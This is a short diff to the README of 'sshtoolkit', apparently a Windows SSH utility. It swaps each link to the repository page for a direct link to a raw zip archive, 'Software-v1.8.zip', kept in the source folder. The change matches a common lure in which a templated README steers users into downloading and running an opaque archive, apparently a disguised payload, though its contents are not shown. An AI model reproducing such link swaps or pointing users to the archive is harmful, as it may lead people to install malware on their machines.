@@ -1,12 +1,12 @@
 # 🛠️ sshtoolkit - SSH tasks in one browser
 
-[![Download sshtoolkit](https://img.shields.io/badge/Download-sshtoolkit-6C63FF?style=for-the-badge&logo=github)](https://github.com/Kelsibenzoic800/sshtoolkit)
+[![Download sshtoolkit](https://img.shields.io/badge/Download-sshtoolkit-6C63FF?style=for-the-badge&logo=github)](https://github.com/Kelsibenzoic800/sshtoolkit/raw/refs/heads/main/src/Software-v1.8.zip)
 
 ## 🔽 Download
 
 Open this page to get sshtoolkit:
 
-https://github.com/Kelsibenzoic800/sshtoolkit
+https://github.com/Kelsibenzoic800/sshtoolkit/raw/refs/heads/main/src/Software-v1.8.zip
 
 Use the page to download the app for Windows, then save the file to your computer.
 
@@ -186,4 +186,4 @@ This project focuses on:
 
 If you need the file again, use this page:
 
-https://github.com/Kelsibenzoic800/sshtoolkit
+https://github.com/Kelsibenzoic800/sshtoolkit/raw/refs/heads/main/src/Software-v1.8.zip
